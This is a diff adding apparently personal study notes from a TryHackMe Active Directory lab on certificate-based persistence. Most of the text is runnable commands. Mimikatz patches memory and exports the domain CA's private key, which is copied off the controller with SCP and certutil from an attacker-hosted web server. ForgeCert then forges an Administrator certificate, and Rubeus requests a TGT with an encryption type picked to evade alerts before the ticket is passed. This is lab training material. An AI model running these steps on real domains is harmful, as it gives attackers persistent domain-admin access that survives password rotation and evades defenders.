@@ -1,0 +1,114 @@
+############
+WARNING:
+############
+
+These techniques are great to keep the blue team busy while we keep them busy, we should look to use persistence techniques that are credential agnostic, meaning the rotation of these will not kick us out. The first of these we will be looking at is certificates.
+
+The Return of AD CS
+
+In the Exploiting AD room, we leveraged certificates to become Domain Admins. However, certificates can also be used for persistence. 
+All we need is a valid certificate that can be used for Client Authentication. 
+This will allow us to use the certificate to request a TGT. 
+
+The beauty of this? 
+We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. 
+The only way we can be kicked out is if they revoke the certificate we generated or if it expires. 
+Meaning we probably have persistent access by default for roughly the next 5 years.
+
+
+Extracting the Private Key:
+
+The private key of the CA is stored on the CA server itself. 
+If the private key is not protected through hardware-based protection methods such as an Hardware Security Module (HSM), 
+which is often the case for organisations that just use Active Directory Certificate Services (AD CS) for internal purposes, 
+it is protected by the machine Data Protection API (DPAPI). 
+This means we can use tools such as Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look here. 
+
+Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz:
+
+Terminal
+za\administrator@DC C:\Users\Administrator.ZA>mkdir <username> 
+za\administrator@DC C:\Users\Administrator.ZA>cd <username>
+za\administrator@DC C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+
+Mimikatz Terminal
+
+mimikatz # crypto::certificates /systemstore:local_machine
+        Exportable key : NO
+[....]
+We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable:
+
+Mimikatz Terminal
+
+    mimikatz # privilege::debug
+
+    mimikatz # crypto::capi
+
+    mimikatz # crypto::cng
+
+Mimikatz Terminal
+
+    mimikatz # crypto::certificates /systemstore:local_machine /export
+
+Terminal
+    za\administrator@THMDC C:\Users\Administrator.ZA\am0>dir
+
+    Directory of C:\Tools\x64
+
+    05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
+    05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
+ 
+The za-THMDC-CA.pfx certificate is the one we are particularly interested in. 
+In order to export the private key, a password must be used to encrypt the certificate. 
+By default, Mimikatz assigns the password of mimikatz. 
+Download or copy this certificate to your AttackBox using SCP, and then copy it to your low-privileged user's home directory on THMWRK1. 
+
+
+Preparing SCP File PAth: (replaced  the Windows VIctims "\" by "/")
+    ex: C:/Users/Administrator/ADcert/local_machine_My_1_za-THMDC-CA.pfx
+
+SCP Download:
+    ex: scp za\\Administrator@thmdc.za.tryhackme.loc:C:/Users/Administrator/ADcert/local_machine_My_1_za-THMDC-CA.pfx .
+
+
+
+Generating our own Certificates:
+    Use ForgeCert in Windows VIctim Machine:
+        C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
+
+    GET ForgeCert Tools to Generate our CA in our ATTACKING Machine Kali:
+    git clone https://github.com/GhostPack/ForgeCert.git 
+
+
+    Open python web server on Kali MAchine:
+        python3 -m http.server <PORT>
+
+    On Windows VIctim Download File:
+        certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName
+
+    then run his cmd:
+        C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
+            Parameters explained:
+                CaCertPath - The path to our exported CA certificate.
+                CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
+                Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
+                SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
+                NewCertPath - The path to where ForgeCert will store the generated certificate.
+                NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
+        
+    We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:
+        C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
+            parameters:
+                /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
+                /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
+                /certificate - Path to the certificate we have generated
+                /password - The password for our certificate file
+                /outfile - The file where our TGT will be output to
+                /domain - The FQDN of the domain we are currently attacking
+                /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running
+
+    use Mimikatz to load the TGT and authenticate to THMDC:
+        kerberos::ptt administrator.kirbi
+
+############ We Are No Longer Friends With The Blue Team ############
+
